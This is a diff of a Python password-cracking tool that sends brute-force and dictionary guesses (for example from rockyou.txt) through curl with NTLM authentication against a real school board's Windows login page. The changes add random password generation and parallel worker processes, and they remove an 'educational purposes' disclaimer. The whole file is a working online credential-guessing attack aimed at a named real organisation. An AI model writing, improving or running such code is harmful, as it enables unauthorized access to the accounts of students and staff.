@@ -1,84 +1,125 @@
-import itertools
+import random
 import subprocess
-import warnings
-from multiprocessing import Pool
+from multiprocessing import Queue, Process, cpu_count, Pool, Manager
 import time
 import getopt
 import sys
 from colorama import Fore
 
-
 dictionary_file = ""
 
-def is_valid_password(args):
-    user, password = args
+def check_passwords1(username, passwords, result_queue):
+    with Pool(cpu_count()) as pool:
+        results = pool.starmap(is_valid_password1, [(username, password, result_queue) for password in passwords])
+    for result in results:
+        if result:
+            print(Fore.RED + f"[!!!] Valid password found: {result}")
+            break
+
+def is_valid_password1(user, password, result_queue):
     url = f'https://www.yrdsb.ca/_windows/default.aspx?ReturnUrl='
     command = f'curl -k --ntlm -u "{user}:{password}" -o {user}.html "{url}"'
     result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     print("[+] Testing for password: " + password)
     if "100   120  100   120    0     0" in result.stderr:
         print(Fore.WHITE + f"[!!!] Valid password found: {password}")
-        exit()
+        result_queue.put(password)
 
-def generate_password():
-    for password_tuple in itertools.product("abcdefghijklmnopqrstuvwxyz0123456789", repeat=8):
-        password = "".join(password_tuple)
-        if len(set(password)) == 8 and password.count("0") + password.count("1") >= 2:
-            return password
+def is_valid_password(user, password_queue, result_queue):
+    while True:
+        password = password_queue.get()
+        if password is None:
+            break
+        url = f'https://www.yrdsb.ca/_windows/default.aspx?ReturnUrl='
+        command = f'curl -k --ntlm -u "{user}:{password}" -o {user}.html "{url}"'
+        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        print("[+] Testing for password: " + password)
+        if "100   120  100   120    0     0" in result.stderr:
+            print(Fore.WHITE + f"[!!!] Valid password found: {password}")
+            result_queue.put(password)
 
-def check_passwords(username, passwords):
-    with Pool() as pool:
-        pool.map(is_valid_password, [(username, password) for password in passwords])
+
+
+def generate_passwords(num_passwords, password_queue):
+    for i in range(int(float(num_passwords))):
+        password_list = random.sample("abcdefghijklmnopqrstuvwxyz", k=random.randint(2, 7))
+        password_list += random.choices("0123456789", k=8 - len(password_list))
+        random.shuffle(password_list)
+        password = ''.join(password_list)
+        password_queue.put(password)
+
+
+def check_passwords(username, num_passwords):
+    result_queue = Queue()
+    password_queue = Queue()
+    generator_process = Process(target=generate_passwords, args=(num_passwords, password_queue))
+    generator_process.start()
+    test_processes = []
+    for i in range(cpu_count()):
+        test_process = Process(target=is_valid_password, args=(username, password_queue, result_queue))
+        test_process.start()
+        test_processes.append(test_process)
+
+    for test_process in test_processes:
+        test_process.join()
+    generator_process.terminate()
+    if not result_queue.empty():
+        valid_password = result_queue.get()
+        print(Fore.WHITE + f"[!!!] Valid password found: {valid_password}")
+    else:
+        exit(Fore.RED + f"[-] Password not found with {num_passwords} attempts :(")
+
 
 def dic(username):
     global dictionary_file
     try:
-        with open(dictionary_file, "r") as password_file:
-            passwords = [line.strip() for line in password_file]
+        with open(dictionary_file, "r") as dictionary_file_file:
+            passwords = [line.strip() for line in dictionary_file_file]
     except FileNotFoundError:
         print(Fore.RED + f"[-] No dictionary file by the name of '{dictionary_file}' was found")
         return
-    print(Fore.LIGHTGREEN_EX + f"[~] Dictionary list = {dictionary_file}")
-    check_passwords(username, passwords)
 
-def brute(username):
-    password = generate_password()
-    check_passwords(username, password)
+    with Manager() as manager:
+        result_queue = manager.Queue()
+        print(Fore.LIGHTGREEN_EX + f"[~] Dictionary list = {dictionary_file}")
+        check_passwords1(username, passwords, result_queue=result_queue)
 
-def check_config():
-    global dictionary_file
-    try:
-        with open("Keys.txt", "r") as s:
-            for i in s.read().split("\n"):
-                if "username = " in i:
-                    username = i.split('username = "')[1].split('"')[0]
-                    print("Username: " + username)
-                if "cores = " in i:
-                    num_processes = int(i.split('cores = "')[1].split('"')[0])
-                    print("Cores: " + str(num_processes))
-                if "dictlist = " in i:
-                    dictionary_file = i.split('dictlist = "')[1].split('"')[0]
-        time.sleep(1)
-        return username
-    except FileNotFoundError:
-        print("Keys.txt not found.")
-        input()
-        exit()
+
+def brute(username, num_passwords):
+    print(Fore.LIGHTGREEN_EX + "[~] Starting brute-force, please be patient.")
+    check_passwords(username, num_passwords)
+
 
 def main():
+    global dictionary_file
     while True:
         z = input(
-            "-----------------------\n[0] Exit\n[1] Brute-Force\n[2] Dictionary Attack\n-----------------------\n")
+            Fore.GREEN + "-----------------------\n[0] Exit\n[1] Brute-Force\n[2] Dictionary Attack\n-----------------------\n")
         if z == "0":
             exit()
         elif z == "1":
-            print("Please be patient, passwords are generating...")
-            brute(check_config())
+            username = input(Fore.GREEN + "[?] What is the username?:\n")
+            num_passwords = int(input(Fore.GREEN + "[?] How many passwords to generate and test?:\n"))
+            print(Fore.GREEN + "[~] Please be patient, passwords are generating and testing...")
+            brute(username, num_passwords)
         elif z == "2":
-            dic(check_config())
+            username = input(Fore.GREEN + "[?] What is the username?:\n")
+            while True:
+                dictionary_file = input(
+                    Fore.GREEN + "[?] What is the dictionary file? (eg. C:\\Users\\User\\Downloads\\rockyou.txt):\n")
+                try:
+                    with open(dictionary_file, "r"):
+                        print(Fore.GREEN + f"[~] {dictionary_file} is a valid file!")
+                        break
+                except:
+                    print(Fore.RED + f"[-] {dictionary_file} is not a valid file.")
+            print(Fore.LIGHTGREEN_EX + "[~] Dictionary attack starting...")
+            dic(username)
+
 
 if __name__ == '__main__':
-    opts, args = getopt.getopt(sys.argv[1:], "hu:p:b",["simple","help","username","passwords", "brute-force","quiet"])
+    opts, args = getopt.getopt(sys.argv[1:], "hu:p:bn:",
+                               ["simple", "help", "username", "passwords", "brute-force", "quiet", "numbers"])
     print(Fore.GREEN + """--------------------------------------------------------------------------------------------------------------
 __   _____________  ___________  ______                                   _   _____                _    
 \ \ / / ___ \  _  \/  ___| ___ \ | ___ \                                 | | /  __ \              | |   
@@ -90,11 +131,11 @@ __   _____________  ___________  ______                                   _   __
 --------------------------------------------------------------------------------------------------------------""")
     if any(opt in ('--help', '-h') for opt, _ in opts):
         print(Fore.GREEN + "-h --help:\n"
-              f"[~] Usage: python {sys.argv[0]} -u username -p password-list --quiet"
-              "\n--------------------------------------------------------------------------------------------------------------"
-              f"\nOR python {sys.argv[0]} -u username --brute-force (WIP)"
-              f"\nSimple mode --> {sys.argv[0]} --simple"
-              "\n--------------------------------------------------------------------------------------------------------------"
+                           f"[~] Usage: python {sys.argv[0]} -u username -p password-list "
+                           "\n--------------------------------------------------------------------------------------------------------------"
+                           f"\nBrute Force --> python {sys.argv[0]} -u username -b -n amount-of-passwords"
+                           f"\nSimple mode --> {sys.argv[0]} --simple"
+                           "\n--------------------------------------------------------------------------------------------------------------"
               )
 
     if any(opt in ('--username', '-u') for opt, _ in opts):
@@ -108,47 +149,25 @@ __   _____________  ___________  ______                                   _   __
             dictionary_file = opts[1][1]
             dic(username)
         elif any(opt in ('--brute-force', '-b') for opt, _ in opts):
-            print(Fore.LIGHTGREEN_EX + "[~] Starting brute-force, please be patient.")
-            brute(username)
+            if any(opt in ('--numbers', '-n') for opt, _ in opts):
+                num = opts[2][1]
+                print(Fore.LIGHTGREEN_EX + "[~] Starting brute-force, please be patient.")
+                brute(username, num)
         else:
-            print(Fore.RED + "[-] You need to have a password (--passwords or -p) list, or a brute-force (--brute-force or -b) attack option.")
+            print(
+                Fore.RED + "[-] You need to have a password (--passwords or -p) list, or a brute-force (--brute-force or -b) attack option.")
             exit()
     else:
         while True:
-            jj = input(Fore.RED + f"[-] Provide an option to run this tool (-h after {sys.argv[0]} for help), do you want to run simple mode? (y/n):\n")
-            if jj.lower() not in ["n","y"]:
+            jj = input(
+                Fore.RED + f"[-] Provide an option to run this tool (-h after {sys.argv[0]} for help), do you want to run simple mode? (y/n):\n")
+            if jj.lower() not in ["n", "y"]:
                 print(Fore.RED + "[-] Please type in y for yes or n for no.")
-            elif jj.lower == "n":
-                exit()
             else:
-                
-
-
-
+                break
+        if jj.lower() == "y":
+            main()
 
     if any(opt in ('--simple') for opt, _ in opts):
-        while True:
-            xd = input("[0] Exit\n[1] Start thingy\n[2] Help\n----------------------------\n")
-            if xd not in ['0', '1', '2']:
-                print(f"Not a valid selection: {xd}")
-            elif int(xd) == 0:
-                print("bye bye.")
-                time.sleep(1)
-                exit()
-            elif int(xd) == 1:
-                main()
-            elif int(xd) == 2:
-                print("""
-[?] This tool is for educational purposes, NOT for any illegal/wrong purposes. I am NOT
-responsible for ANY damage that you use with this tool (please, no damages). This is NOT DESIGNED for 
-ANY WRONG DOINGS. Do NOT use this tool illegally. That is called INVASION OF PRIVACY and you can go to jail. 
-ONLY USE THIS ON YOUR OWN ACCOUNT. Unauthorized access, invasion of privacy, and illegal activities are not only 
-unethical but can also lead to legal consequences.
------------------------------------------------------------------------------------------------------
-Just follow the instructions that are going to be listed on the screen, lol
------------------------------------------------------------------------------------------------------
-Press enter to move back to the tool...
-""")
-                input()
-
+        main()
 
